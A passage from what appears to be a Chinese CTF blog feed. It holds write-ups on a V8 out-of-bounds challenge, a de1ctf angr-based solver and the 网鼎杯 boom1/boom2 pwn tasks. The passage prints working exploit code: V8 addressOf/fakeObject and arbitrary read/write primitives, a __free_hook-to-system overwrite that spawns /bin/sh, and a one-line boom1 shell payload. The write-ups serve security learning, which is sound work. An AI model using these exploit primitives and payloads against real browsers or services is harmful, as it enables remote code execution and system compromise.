alt="image-20200602152549629"></p><p>可以看到<code>oob()</code>函数泄露出的内容就是我们分析的那样。而在<code>oob(1)</code>之后我们查看一下内存情况：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200531225935444.png" alt="image-20200531225935444"></p><p>可以看到之前的指已经被覆盖成1的double浮点值了。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在整数的数组中：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200602152910170.png" alt="image-20200602152910170"></p><p>可以看到JSArray的起始地址距离elements是比较远的。而浮点数和对象数组这两个地址是很近的：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200602153029476.png" alt="image-20200602153029476"></p><p>在这两种情况下，其实elements下面就是JSArray，而一个元素的溢出，使得数组的map值是可以被读和写的，而map值控制了这个数组很多信息，比如读取数组中的元素是按对象来读还是浮点数来读。如果我们可以将其混淆，就可以实现任意的对象的地址的读写。</p><h4 id="任意对象地址读"><a href="#任意对象地址读" class="headerlink" title="任意对象地址读"></a>任意对象地址读</h4><p>就是用float数组的map去覆盖object数组的map，然后读object数组中的元素，就可以将对象的地址读出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">object</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = object;</span><br><span class="line">    obj_array.oob(float_map);</span><br><span class="line">    <span class="keyword">var</span> object_addr = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(object_addr) <span class="number">-1n</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="任意对象构造"><a href="#任意对象构造" class="headerlink" title="任意对象构造"></a>任意对象构造</h4><p>就是用object数组的map去覆盖float数组的map，然后读float数组中的元素，就可以得到对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">fake_addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(fake_addr);</span><br><span class="line">    float_array.oob(obj_map);</span><br><span class="line">    <span class="keyword">var</span> fake_object = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_map);</span><br><span class="line">    <span class="keyword">return</span> fake_object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>新手心路:</strong>  当我学这个东西，到这里我是懵逼的，因为我不知道为什么要构造这两个函数。后面整个学完后才了解原因，在下一小节，我结合实例说一下自己的认识。</p><h4 id="构造fake-object"><a href="#构造fake-object" class="headerlink" title="构造fake object"></a>构造fake object</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evil_array= [float_map, <span class="comment">//fake map</span></span><br><span class="line">                 <span class="number">0.0</span>,       <span class="comment">// fake properties</span></span><br><span class="line">                 i2f(<span class="number">0x111n</span>), <span class="comment">// fake elements</span></span><br><span class="line">                 i2f(<span class="number">0x400000000n</span>) <span class="comment">//fake length</span></span><br><span class="line">                ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> leak_addr = addressOf(evil_array);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] leak obj addr: "</span> + hex(leak_addr));</span><br><span class="line"><span class="keyword">var</span> fake_obj_addr = leak_addr+<span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_obj = fakeObject(fake_obj_addr+<span class="number">1n</span>);</span><br></pre></td></tr></table></figure><p>因为实际上，我们后面需要伪造一个fake object，而fake object中的属性也是以数组的形式存储的，即evil_array，那么我们需要能够操作fake object才能实现任意地址的读写：</p><p>fake object如何操作。我们构造的fake object是通过evil_array，而修改evil_array也只能修改我们构造的fake object中间的属性，想要操作fake object的element是不可能的。</p><p>而解决这个问题就需要我们第二个函数，任意对象的构造，如果此时evil_array的elements中value的地址传给了这个函数即我们构造的假对象内容，那么函数就会将其作为对象返回给我们，我们就可以操控fake object中的element内容了，这个时候我们只需要操作evil_array[2]，即fake element，就可以改变element的地址，从同fake object而实现任意地址读写。</p><p>而要达到这个目的，就需要fake object的地址，这就需要了第一个函数：任意对象地址读，先得到evil_array的地址，之后将其和fake object的相对偏移相运算，就得到了fake object的地址。</p><h4 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h4><p>接下来的任意地址读写也是非常简单了，修改evil_array[2]，到任意地址，然后就修改或查看fake_object[0]，即可实现目的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">        <span class="keyword">var</span> leak_data = f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        evil_array[<span class="number">2</span>] = i2f(addr<span class="number">-0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">        fake_obj[<span class="number">0</span>] = i2f(data);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个题目其实这样的写操作是不行的，因为这个函数在写0x7f的时候貌似会出现问题，于是利用这个函数，操作DataView，进而实现任意地址的读写，这个具体的机制，目前我还在学习（捂脸苦笑）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dataview_write</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        write64(addressOf(data_buf)+<span class="number">0x20n</span>,addr);</span><br><span class="line">        data_view.setFloat64(<span class="number">0</span>,i2f(data),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面的其实就是找到一个text的地址，之后查got表得到libc地址，最后改__free_hook为system，最后getshell。其实后面有很多东西我也不是很清楚，但是目前我就一知半解的先将其当作公式方法之类的。比如如何寻找text地址和如果触发free。就像刚开始学pwn，咱也不知道为啥改got表，就改就完了，后面慢慢了解。加油（菜鸡的自我安慰）。</p><p>后面的操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> a_constructor_addr = addressOf(a.constructor);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] leak addr: "</span> + hex(a_constructor_addr));</span><br><span class="line"><span class="keyword">var</span> text_addr = (read64(read64(a_constructor_addr + <span class="number">0x30n</span>)<span class="number">-1n</span> +<span class="number">0x40n</span>) &gt;&gt; <span class="number">16n</span> )- <span class="number">0xad54e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] text addr: "</span> + hex(text_addr));</span><br><span class="line"><span class="keyword">var</span> sprintf_got = text_addr+<span class="number">0xd9aa28n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] sprintf got addr: "</span> + hex(sprintf_got));</span><br><span class="line"><span class="keyword">var</span> libc_addr = read64(sprintf_got) - <span class="number">0x65000n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc addr: "</span> + hex(libc_addr));</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_addr + <span class="number">0x4f440n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook_addr = libc_addr + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] system addr: "</span> + hex(system_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] free hook addr: "</span> + hex(free_hook_addr));</span><br><span class="line"></span><br><span class="line">dataview_write(free_hook_addr,system_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x0068732f6e69622fn</span>), <span class="literal">true</span>); <span class="comment">//16进制内容为/bin/sh</span></span><br></pre></td></tr></table></figure><h3 id="PWN！！！"><a href="#PWN！！！" class="headerlink" title="PWN！！！"></a>PWN！！！</h3><p>虽然很菜，但是还是pwn了，开心：</p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200602160446894.png" alt="image-20200602160446894"></p><p><img src="/2020/06/01/v8%E5%BC%80%E5%9D%91/image-20200602160512211.png" alt="image-20200602160512211"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> browser </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf code_runner WP</title>
      <link href="/2020/05/11/de1-wp/"/>
      <url>/2020/05/11/de1-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本周参加了两个比赛，一个是de1CTF，另一个是网鼎杯，把这两场比赛全部总结一下。</p><p>在de1CTF中，只有一道常规的x64题目，其他题目。。。。。。。</p><p>反正挺好玩的，我就把aeg的mips，总结一下吧</p><p>关键字： <code>CTF</code> <code>pwn</code> <code>baby aeg</code> <code>de1ctf</code></p><a id="more"></a><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>这个题目和以前出的aeg题目也挺像的，一大堆检查，最后让你输入一个shellcode</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>前面检查的部分，用angr解决了，后面直接输入mips的shellcode</p><p>题目中大多数的函数都是可以用angr直接求解的，但是有一个例外：</p><p>就是形如这个的函数：</p><p><img src="/2020/05/11/de1-wp/image-20200511142112134.png" alt="image-20200511142112134"></p><p>在这个函数中，angr跑起来非常吃力，所以，我们需要将这个函数单独解析。</p><p>这个函数的大小是固定的444，所以定位起来也是比较容易，解析里面的参数，主要就是解析if语句中的符号和param_1数组的下标，位置也相对固定，直接从机器码中取，除了这个函数以外的函数，一律用angr跑。</p><p>那么这个当前由于自己比较懒，没有适配多个这种函数的情况，所以，需要自己跑一下，跑出只要一个这种函数的情况。</p><p>比如以下情况就不行：</p><p><img src="/2020/05/11/de1-wp/image-20200511142433295.png" alt="image-20200511142433295"></p><p>这里的上述函数有2个，所以我直接退出了，感兴趣的小伙伴，直接适配一下就好，很简单的。</p><p>那么当程序中上述的函数就一个的时候，就得到结果了：</p><p><img src="/2020/05/11/de1-wp/image-20200511142651849.png" alt="image-20200511142651849"></p><p>最后那个shellcode没写，懒得写了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#start analyses binary</span></span><br><span class="line">filename = <span class="string">"h"</span></span><br><span class="line">proj = angr.Project(filename,load_options=&#123;<span class="string">'auto_load_libs'</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"><span class="comment"># find main function</span></span><br><span class="line">cfg = proj.analyses.CFGFast()</span><br><span class="line"><span class="keyword">for</span> addr,b <span class="keyword">in</span> cfg.kb.functions.items():</span><br><span class="line">    <span class="keyword">if</span> (b.name == <span class="string">"main"</span>):</span><br><span class="line">        main_address = addr</span><br><span class="line">        print(b)</span><br><span class="line">        print(<span class="string">"[+] main_address: "</span>+hex(main_address))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># binary has a hard function to solve by symbolic execution</span></span><br><span class="line"><span class="comment"># we need to find it</span></span><br><span class="line"><span class="comment"># we can find it's size always is 444</span></span><br><span class="line">before_address = <span class="number">0</span></span><br><span class="line">bb_address = <span class="number">0</span></span><br><span class="line">next_address = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">num =<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> addr,b <span class="keyword">in</span> cfg.kb.functions.items():</span><br><span class="line">    <span class="keyword">if</span> (addr &gt; main_address):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> addr - before_address == <span class="number">444</span>:</span><br><span class="line">        hard_function_address = before_address</span><br><span class="line">        next_address = bb_address</span><br><span class="line">        print(<span class="string">"[+] hard_function_address: "</span>+hex(before_address))</span><br><span class="line">        print(<span class="string">"[+] next_function_address: "</span>+hex(next_address))</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bb_address = before_address</span><br><span class="line">        before_address = addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> num !=<span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"[-] hard function's num is not equal 1"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># before the hard function</span></span><br><span class="line"><span class="comment"># we use symbolic execution to solve the problem</span></span><br><span class="line">target_address = hard_function_address</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=target_address)</span><br><span class="line">tmp_result = simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#print(tmp_result)</span></span><br><span class="line">tmp_result = tmp_result.split(<span class="string">b'\x00'</span>*<span class="number">10</span>)[<span class="number">0</span>]</span><br><span class="line">print(tmp_result)</span><br><span class="line"><span class="comment"># now we get the solve of the binary before hard function</span></span><br><span class="line"><span class="comment"># the we need to analyse the hard function,we define the function: hard_function_solve()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_num</span><span class="params">(function_content,num)</span>:</span></span><br><span class="line">    one = function_content[num]</span><br><span class="line">    <span class="keyword">if</span> one == <span class="number">0</span>:</span><br><span class="line">        two_num = num+<span class="number">28</span></span><br><span class="line">        three_num = num+<span class="number">84</span></span><br><span class="line">        four_num = three_num + <span class="number">36</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        two_num = num+<span class="number">36</span></span><br><span class="line">        <span class="keyword">if</span> function_content[two_num] == <span class="number">0</span>:</span><br><span class="line">            three_num = num+<span class="number">84</span></span><br><span class="line">            four_num = three_num + <span class="number">36</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            three_num = num+<span class="number">92</span></span><br><span class="line">            <span class="keyword">if</span> function_content[three_num] == <span class="number">0</span>:</span><br><span class="line">                four_num = three_num + <span class="number">28</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                four_num = three_num + <span class="number">36</span></span><br><span class="line">    <span class="keyword">return</span> [function_content[num],function_content[two_num],function_content[three_num],function_content[four_num]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hard_function_analyse</span><span class="params">(hard_address)</span>:</span></span><br><span class="line">    f_b = open(filename,<span class="string">"rb"</span>)</span><br><span class="line">    function_content = f_b.read()[hard_address<span class="number">-0x400000</span>:hard_address<span class="number">-0x400000</span>+<span class="number">444</span>]</span><br><span class="line">    print(<span class="string">"content_len:"</span>+str(len(function_content)))</span><br><span class="line">    <span class="comment">#1 step</span></span><br><span class="line">    <span class="keyword">if</span> function_content[<span class="number">199</span>] == <span class="number">0x10</span>:</span><br><span class="line">        difference_1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> function_content[<span class="number">199</span>] == <span class="number">0x14</span>:</span><br><span class="line">        difference_1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] 1 step can not get option"</span>)</span><br><span class="line">    <span class="comment">#2 step</span></span><br><span class="line">    <span class="keyword">if</span> function_content[<span class="number">383</span>] == <span class="number">0x10</span>:</span><br><span class="line">        difference_2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> function_content[<span class="number">383</span>] == <span class="number">0x14</span>:</span><br><span class="line">        difference_2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] 2 step can not get option"</span>)</span><br><span class="line"></span><br><span class="line">    one = count_num(function_content,<span class="number">24</span>)</span><br><span class="line">    two = count_num(function_content,<span class="number">208</span>)</span><br><span class="line">    print(one)</span><br><span class="line">    print(two)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">                    int_arr = [i,j,n,m]</span><br><span class="line">                    v1_1 = abs(int_arr[one[<span class="number">0</span>]] ** <span class="number">2</span> - int_arr[one[<span class="number">1</span>]] ** <span class="number">2</span>)</span><br><span class="line">                    v1_2 = abs(int_arr[one[<span class="number">2</span>]] ** <span class="number">2</span> - int_arr[one[<span class="number">3</span>]] ** <span class="number">2</span>)</span><br><span class="line">                    <span class="keyword">if</span> (v1_2 &gt; v1_1) != difference_1:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        v2_1 = abs(int_arr[two[<span class="number">0</span>]] ** <span class="number">2</span> - int_arr[two[<span class="number">1</span>]] ** <span class="number">2</span>)</span><br><span class="line">                        v2_2 = abs(int_arr[two[<span class="number">2</span>]] ** <span class="number">2</span> - int_arr[two[<span class="number">3</span>]] ** <span class="number">2</span>)</span><br><span class="line">                        <span class="keyword">if</span> (v2_2 &gt; v2_1) == difference_2:</span><br><span class="line">                            print(int_arr)</span><br><span class="line">                            <span class="keyword">return</span> bytes((i,j,n,m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hard_string = hard_function_analyse(hard_function_address)</span><br><span class="line">print(hard_string)</span><br><span class="line"></span><br><span class="line">final_address = <span class="number">0x00400b30</span></span><br><span class="line">start_address = next_address</span><br><span class="line"><span class="comment">#state = proj.factory.entry_state()</span></span><br><span class="line">st = proj.factory.blank_state(addr=next_address)</span><br><span class="line">tmp_key = claripy.BVS(<span class="string">'tmp_key'</span>, <span class="number">8</span>*<span class="number">64</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">    st.memory.store(st.regs.sp+<span class="number">0x60</span>+i,tmp_key.get_byte(i))</span><br><span class="line">st.regs.a0 = st.regs.sp+<span class="number">0x60</span></span><br><span class="line"><span class="comment">#sm = proj.factory.simulation_manager(st)</span></span><br><span class="line"><span class="comment">#print(type(tmp_key))</span></span><br><span class="line">simgr_2 = proj.factory.simgr(st)</span><br><span class="line">simgr_2.explore(find=final_address)</span><br><span class="line">key = simgr_2.found[<span class="number">0</span>].solver.eval(tmp_key,cast_to=bytes)</span><br><span class="line">print(key)</span><br><span class="line">result = tmp_result+hard_string+key</span><br><span class="line">print(result)</span><br><span class="line">f_r = open(filename+<span class="string">"_out"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f_r.write(result)</span><br><span class="line">p.recvuntil(<span class="string">"Faster &gt; \n"</span>)</span><br><span class="line">p.sendline(result)</span><br><span class="line"><span class="keyword">print</span> (p.recvuntil(<span class="string">"&gt;"</span>))</span><br><span class="line">p.sendline(<span class="string">"\x00XYNM"</span>)</span><br><span class="line">print(p.recvuntil(<span class="string">"Your time comes.\n&gt;</span></span><br></pre></td></tr></table></figure><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> baby_aeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯pwn WP</title>
      <link href="/2020/05/11/wdb-wp/"/>
      <url>/2020/05/11/wdb-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本周参加了两个比赛，一个是de1CTF，另一个是网鼎杯，把这两场比赛全部总结一下。</p><p>在网鼎杯中，有幸拿了一个签到pwn的一血，也是蛮开心的，其中boom1和boom2主要是两道类似于编译和执行的题目，boom1要求选手写一些高级语言，boom2要求选手写类似于机器码，总体来说都不难，最后的faster0也是这几次常出现的aeg题目，其实更准确的应该说是自动逆向的题目，和最后漏洞利用其实相关性不大。</p><p>将这些题目总结一下吧。</p><p>关键字： <code>CTF</code> <code>pwn</code> <code>baby aeg</code> <code>网鼎杯</code></p><a id="more"></a><h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>boom1打开后看起来内容很多，其实很多内容都不需要逆向。首先看到下面这个字符串时，已经大致猜到了什么：</p><p><img src="/2020/05/11/wdb-wp/image-20200511101514250.png" alt="image-20200511101514250"></p><p>这就类似于高级语言预订的一些关键词，那么也就是，我们用这些东西来写程序就好了。</p><p>在后面的动态运行中，我发现了，需要定义main函数，以及需要分号作为结尾。而且函数只能运行一次：</p><p><img src="/2020/05/11/wdb-wp/image-20200511101754172.png" alt="image-20200511101754172"></p><p>否则就会打印NOTALLOW。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>修改__free_hook为system，最后调用free(“/bin/sh”);</p><p>这个程序会把我们写好的程序的变量之类的，放置在malloc的区域，而此时malloc的大小是0x40000的，也就是这一空间必然是mmap出的新空间，且与libc是相邻的，那么我们就不需要知道libc的基地址，而直接通过偏移去得到__free_hook和system的地址。</p><h3 id="pwn！！！"><a href="#pwn！！！" class="headerlink" title="pwn！！！"></a>pwn！！！</h3><p>首先判断libc版本，在内存中，其实是有libc版本记录的地方，在peda中使用类似:<code>find 2.23</code>，这样的语句就可以找到，而且总是有一个地址是与0x8对齐的，因为我们这里计算的偏移都是以0x8为一个单位。最后我计算出这个偏移为471879。计算方法就是用定义的a的地址减去目标地址，最后除以8。</p><p><img src="/2020/05/11/wdb-wp/image-20200511102438106.png" alt="image-20200511102438106"></p><p>可以看到，此时打印2.23，那么原创也可以测试出来就是2.23的libc版本。</p><p>最后用类似的方法计算出free_hook和system的值就好了：</p><p><img src="/2020/05/11/wdb-wp/image-20200511102639601.png" alt="image-20200511102639601"></p><p>最后的payload：<code>main(){int a;*(&amp;a-180998)=&amp;a-640393;free(&quot;/bin/sh&quot;);}</code></p><p>就这样，我也收获了签到题的一血，开心！！！：</p><p><img src="/2020/05/11/wdb-wp/image-20200511102904540.png" alt="image-20200511102904540"></p><p>最后说一下，这个题payload真的太短了，太简单py了，感觉主办方需要考虑这个问题。</p><h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>boom2是需要逆向的一道题目：</p><p>我只说几个关键的逆向：</p><h4 id="大体机制"><a href="#大体机制" class="headerlink" title="大体机制"></a>大体机制</h4><p>本题主要是一个栈空间，附带一个寄存器。</p><p>我们输入指令的时候需要一个指令占64bit，也就是8个字节</p><h4 id="push指令–13"><a href="#push指令–13" class="headerlink" title="push指令–13"></a>push指令–13</h4><p>直接p64(13)就是push。</p><p><img src="/2020/05/11/wdb-wp/image-20200511103128303.png" alt="image-20200511103128303"></p><h4 id="pop操作指令–后面全都是"><a href="#pop操作指令–后面全都是" class="headerlink" title="pop操作指令–后面全都是"></a>pop操作指令–后面全都是</h4><p>直接p64(指令)，就是寄存器和pop出值得运算</p><p><img src="/2020/05/11/wdb-wp/image-20200511103209604.png" alt="image-20200511103209604"></p><h4 id="给寄存器赋值的方式"><a href="#给寄存器赋值的方式" class="headerlink" title="给寄存器赋值的方式"></a>给寄存器赋值的方式</h4><p><img src="/2020/05/11/wdb-wp/image-20200511103333685.png" alt="image-20200511103333685"></p><p>指令0：p64(0)+p64(offset)   